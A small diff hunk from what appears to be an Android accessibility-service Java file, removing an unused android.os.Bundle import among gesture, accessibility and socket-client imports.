@@ -5,7 +5,6 @@ import android.accessibilityservice.GestureDescription;
 import android.graphics.Path;
 import android.graphics.Rect;
 import android.os.Build;
-import android.os.Bundle;
 import android.view.accessibility.AccessibilityNodeInfo;
 
 import com.fason.app.core.network.SocketClient;
